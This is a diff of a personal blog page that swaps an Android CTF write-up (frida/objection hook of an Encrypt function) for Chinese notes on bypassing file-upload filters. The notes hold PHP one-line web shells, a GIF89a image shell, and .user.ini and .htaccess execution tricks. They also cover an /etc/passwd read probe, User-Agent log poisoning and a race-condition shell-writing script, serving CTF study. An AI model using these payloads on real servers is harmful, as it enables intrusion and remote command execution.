@@ -16,24 +16,21 @@
   <meta name="author" content="mowit">
   <meta name="keywords" content="">
   
-    <meta name="description" content="安卓逆向的hook解法">
+    <meta name="description" content="1234567891011121314151617181920212223242526272829303132333435363738&lt;?php     header(&quot;content-type:text&#x2F;html;charset&#x3D;utf-8&quot;);    $filename &#x3D; $_FILES[&amp;#x27;file&amp;#x27;][&amp;#x27;name&amp;#x27;];">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SWPU2019 easyapp的hook解法">
-<meta property="og:url" content="https://mowit07.github.io/2024/04/16/[SWPU%202019]easyapp%E7%9A%84hook%E8%A7%A3%E6%B3%95/index.html">
+<meta property="og:title" content="Mowit">
+<meta property="og:url" content="https://mowit07.github.io/2024/05/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/index.html">
 <meta property="og:site_name" content="Mowit">
-<meta property="og:description" content="安卓逆向的hook解法">
+<meta property="og:description" content="1234567891011121314151617181920212223242526272829303132333435363738&lt;?php     header(&quot;content-type:text&#x2F;html;charset&#x3D;utf-8&quot;);    $filename &#x3D; $_FILES[&amp;#x27;file&amp;#x27;][&amp;#x27;name&amp;#x27;];">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://mowit07.github.io/mdimg/CTFtrain/maomao2.png">
-<meta property="article:published_time" content="2024-04-16T08:13:40.233Z">
-<meta property="article:modified_time" content="2024-04-16T07:49:49.114Z">
+<meta property="article:published_time" content="2024-05-10T07:13:13.058Z">
+<meta property="article:modified_time" content="2024-05-11T08:21:36.447Z">
 <meta property="article:author" content="mowit">
-<meta property="article:tag" content="安卓逆向">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://mowit07.github.io/mdimg/CTFtrain/maomao2.png">
   
   
   
-  <title>SWPU2019 easyapp的hook解法 - Mowit</title>
+  <title>Mowit</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -222,13 +219,13 @@
   
 
 <div id="banner" class="banner" parallax=true
-     style="background: url('/img/maomao2.png') no-repeat center center; background-size: cover;">
+     style="background: url('/img/defaul.png') no-repeat center center; background-size: cover;">
   <div class="full-bg-img">
     <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="SWPU2019 easyapp的hook解法"></span>
+            <span id="subtitle" data-typed-text=""></span>
           
         </div>
 
@@ -244,8 +241,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-04-16 16:13" pubdate>
-          2024年4月16日 下午
+        <time datetime="2024-05-10 15:13" pubdate>
+          2024年5月10日 下午
         </time>
       </span>
     
@@ -256,7 +253,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.1k 字
+          1k 字
         
       </span>
     
@@ -267,7 +264,7 @@
         
         
         
-          18 分钟
+          9 分钟
         
       </span>
     
@@ -312,20 +309,33 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">SWPU2019 easyapp的hook解法</h1>
+            <h1 id="seo-header"></h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="SWPU-2019-easyapp简单objection解法"><a href="#SWPU-2019-easyapp简单objection解法" class="headerlink" title="[SWPU 2019]easyapp简单objection解法"></a>[SWPU 2019]easyapp简单objection解法</h1><p>jadx打开apk文件分析</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.ndktest2;<br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.view.View;<br><span class="hljs-keyword">import</span> android.widget.Button;<br><span class="hljs-keyword">import</span> android.widget.EditText;<br><span class="hljs-keyword">import</span> android.widget.Toast;<br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><br><span class="hljs-comment">/* loaded from: classes.dex */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AppCompatActivity</span> &#123;<br>    <span class="hljs-keyword">private</span> EditText password;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">native</span> String <span class="hljs-title function_">Encrypt</span><span class="hljs-params">()</span>;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        System.loadLibrary(<span class="hljs-string">&quot;native-lib&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* JADX INFO: Access modifiers changed from: protected */</span><br>    <span class="hljs-meta">@Override</span> <span class="hljs-comment">// androidx.appcompat.app.AppCompatActivity, androidx.fragment.app.FragmentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> &#123;<br>        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);<br>        setContentView(R.layout.activity_main);<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">EditText</span> <span class="hljs-variable">password</span> <span class="hljs-operator">=</span> (EditText) findViewById(R.id.password);<br>        ((Button) findViewById(R.id.login)).setOnClickListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">View</span>.OnClickListener() &#123; <span class="hljs-comment">// from class: com.example.ndktest2.MainActivity.1</span><br>            <span class="hljs-meta">@Override</span> <span class="hljs-comment">// android.view.View.OnClickListener</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onClick</span><span class="hljs-params">(View view)</span> &#123;<br>                <span class="hljs-keyword">if</span> (password.getText().toString().equals(MainActivity.<span class="hljs-built_in">this</span>.Encrypt())) &#123;<br>                    Toast.makeText(MainActivity.<span class="hljs-built_in">this</span>, <span class="hljs-string">&quot;登录成功&quot;</span>, <span class="hljs-number">1</span>).show();<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    Toast.makeText(MainActivity.<span class="hljs-built_in">this</span>, <span class="hljs-string">&quot;登录失败&quot;</span>, <span class="hljs-number">0</span>).show();<br>                &#125;<br>            &#125;<br>        &#125;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
-<p>发现调用了Native层的Encrypt函数返回值，这一段和password进行了比较</p>
-<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">password<span class="hljs-selector-class">.getText</span>()<span class="hljs-selector-class">.toString</span>()<span class="hljs-selector-class">.equals</span>(MainActivity<span class="hljs-selector-class">.this</span><span class="hljs-selector-class">.Encrypt</span>())<br></code></pre></td></tr></table></figure>
-<p>直接使用frida和objection配合,先启用frida的服务</p>
-<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs maxima">C:\Users\Mowit&gt;adb devices<br>* daemon <span class="hljs-keyword">not</span> running; starting now <span class="hljs-built_in">at</span> tcp:<span class="hljs-number">5037</span><br>* daemon started successfully<br>List of devices attached<br><span class="hljs-number">1239b413</span>        device<br><br><br>C:\Users\Mowit&gt;adb shell<br>ginkgo:/ $ su<br>ginkgo:/ #<br>ginkgo:/ # cd data/<span class="hljs-built_in">local</span>/tmp<br>ginkgo:/data/<span class="hljs-built_in">local</span>/tmp # ls<br>busybox  crackme1.apk  frida-server-<span class="hljs-number">16.2</span><span class="hljs-number">.1</span>-android-arm64<br>ginkgo:/data/<span class="hljs-built_in">local</span>/tmp # ./frida-server-<span class="hljs-number">16.2</span><span class="hljs-number">.1</span>-android-arm64<br></code></pre></td></tr></table></figure>
-<p>然后使用objection直接hook获取encrypt（）返回值,命令如下</p>
-<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><br>objection -g com<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.ndktest2</span> explore<br><br><br>android hooking watch class_method com<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.ndktest2</span><span class="hljs-selector-class">.MainActivity</span><span class="hljs-selector-class">.Encrypt</span> <span class="hljs-attr">--dump-args</span> <span class="hljs-attr">--dump-backtrace</span> <span class="hljs-attr">--dump-return</span><br></code></pre></td></tr></table></figure>
-<p>得到返回值Return Value: YouaretheB3ST<br>登陆成功</p>
+                <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;content-type:text/html;charset=utf-8&quot;</span>);<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>    <span class="hljs-variable">$temp_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$size</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;size&#x27;</span>];<br>    <span class="hljs-variable">$error</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;error&#x27;</span>];<br>    <span class="hljs-comment">//pathinfo — 返回文件路径的信息</span><br>    <span class="hljs-variable">$arr</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$filename</span>);<br>    <span class="hljs-variable">$ext_suffix</span> = <span class="hljs-variable">$arr</span>[<span class="hljs-string">&#x27;extension&#x27;</span>];<br>    <span class="hljs-comment">//文件&lt;=24</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$size</span> &gt; <span class="hljs-number">24</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error file zise&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">//文件名字长度&lt;=9</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$filename</span>)&gt;<span class="hljs-number">9</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error file name&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">//文件后缀&lt;=3</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$ext_suffix</span>)&gt;<span class="hljs-number">3</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error suffix&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">//后缀过滤掉了大小写的php</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/php/i&quot;</span>,<span class="hljs-variable">$ext_suffix</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error suffix&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">//文件名字也过滤了大小写的php</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/php/i&quot;</span>),<span class="hljs-variable">$filename</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error file name&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">//满足以上则上传成功</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_name</span>, <span class="hljs-string">&#x27;./&#x27;</span>.<span class="hljs-variable">$filename</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;文件上传成功！&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;文件上传失败！&quot;</span>;<br>    &#125;<br><br> <span class="hljs-meta">?&gt;</span><br>构造一个一句话的文本文件<br></code></pre></td></tr></table></figure>
+<?php eval($_POST['a']);
+
+对于php中的.usr.ini有如下解释：
+PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP 不会搜寻。也就是在.usr.ini中如果设置了文件名，那么任意一个页面都会将该文件中的内容包含进去。
+我们在.usr.ini中输入auto_prepend_file =a.txt，这样在该目录下的所有文件都会包含a.txt的内容
+.user.ini中写入 auto_prepend_file=a.txt，然后再写入一个a.txt，里面加入<?php eval($_GET或POST['a']);?><p>用来执行命令。如果写POST一句话使用蚁剑可以连接上，但是提示没有权限。<br>上传之后就可以利用命令执行了，访问?a=print_r(scandir或glob(‘.’));可以发现一个文件名很长的文件，使用?a=highlight_file(‘xxx’)即可输出flag。</p>
+<p>exif_imagetype()函数<br>函数功能是读取一个图像的第一个字节并检查其签名。 在一句话前面加个GIF89a进行绕过<br>那么现在的一句话如下，可以制作成图片马，但是需要解析成php</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">GIF89a <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">assert</span>($_REQUEST[<span class="hljs-string">&#x27;cmd&#x27;</span>])</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p>正常想到的是.htaccess，但是这个服务器是nginx，而.htaccess是针对apache，htaccess 可以通过设置实现nginx文件解析配置，将.png 后缀的文件解析成 php。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">AddType application/x-httpd-php .jpg <br>//htaccess文件内容<br></code></pre></td></tr></table></figure>
+
+<p>所以nginx服务器使用的是 .user.ini  </p>
+<p>UA注入访问日志文件<br>首先需要开启服务器记录日志功能</p>
+<p>在不同的系统，存放日志文件地方和文件名不同<br>apache一般是/var/log/apache/access.log</p>
+<p>nginx的log在/var/log/nginx/access.log和/var/log/nginx/error.log<br>先通过/etc/passwd判断是否存在ssrf漏洞<br>因为不管是什么系统，都会在etc目录下存放passwd文件</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?u</span>rl=<span class="hljs-regexp">/etc/passwd</span><br></code></pre></td></tr></table></figure>
+<p>如果成功访问说明是可以访问内网文件, 那么就可以通过这种方式访问日志文件了<br>可以使用include文件包含等方式包含日志文件 再通过UA注入的方式上传一句话木马让日志记录下来，用蚁剑getshell</p>
+<p>条件竞争上传<br>上传成功后和删除文件之间存在一个短的时间差,要执行检查文件和删除文件的操作,可以利用这个时间差完成竞争条件的上传漏洞</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span>PHP<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-number">1</span>);<br><span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;shell6666.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>),<span class="hljs-string">&#x27;&lt;?php @eval($_POST[1])?&gt;&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># coding:utf-8</span><br>import requests<br>def main():<br>    <span class="hljs-attribute">i</span>=0<br>    <span class="hljs-keyword">while</span> 1:<br>        try:<br>            <span class="hljs-built_in">print</span>(i,<span class="hljs-attribute">end</span>=<span class="hljs-string">&#x27;\r&#x27;</span>)<br>            a = requests.<span class="hljs-built_in">get</span>(<span class="hljs-string">&quot;http://aaa.io/XXXXX.php&quot;</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;c4ca4238a0b923820dcc509a6f75849b&quot;</span> <span class="hljs-keyword">in</span> a.text:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;OK&quot;</span>)<br>                break<br>        except Exception as e:<br>            pass<br>        i+=1<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure>
+<p>c4ca4238a0b923820dcc509a6f75849b为md5的1</p>
 
                 
               </div>
@@ -334,41 +344,6 @@
             <div>
               <div class="post-metas my-3">
   
-    <div class="post-meta mr-3 d-flex align-items-center">
-      <i class="iconfont icon-category"></i>
-      
-
-<span class="category-chains">
-  
-  
-    
-      <span class="category-chain">
-        
-  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
-  
-  
-    <span>></span>
-    
-  <a href="/categories/CTF/Write-Up/" class="category-chain-item">Write Up</a>
-  
-  
-
-  
-
-      </span>
-    
-  
-</span>
-
-    </div>
-  
-  
-    <div class="post-meta">
-      <i class="iconfont icon-tags"></i>
-      
-        <a href="/tags/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91/" class="print-no-link">#安卓逆向</a>
-      
-    </div>
   
 </div>
 
@@ -378,8 +353,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>SWPU2019 easyapp的hook解法</div>
-      <div>https://mowit07.github.io/2024/04/16/[SWPU 2019]easyapp的hook解法/</div>
+      <div></div>
+      <div>https://mowit07.github.io/2024/05/10/文件上传/</div>
     </div>
     <div class="license-meta">
       
@@ -391,7 +366,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2024年4月16日</div>
+          <div>2024年5月10日</div>
         </div>
       
       
@@ -423,18 +398,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2024/05/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" title="">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile"></span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/01/26/%5B%E7%BE%8A%E5%9F%8E%E6%9D%AF2021%20ez_Android%5D%E5%A4%8D%E7%8E%B0/" title="羊城杯2021 ez_Android">
-                        <span class="hidden-mobile">羊城杯2021 ez_Android</span>
+                      <a href="/2024/04/16/%5BSWPU%202019%5Deasyapp%E7%9A%84hook%E8%A7%A3%E6%B3%95/" title="SWPU2019 easyapp的hook解法">
+                        <span class="hidden-mobile">SWPU2019 easyapp的hook解法</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
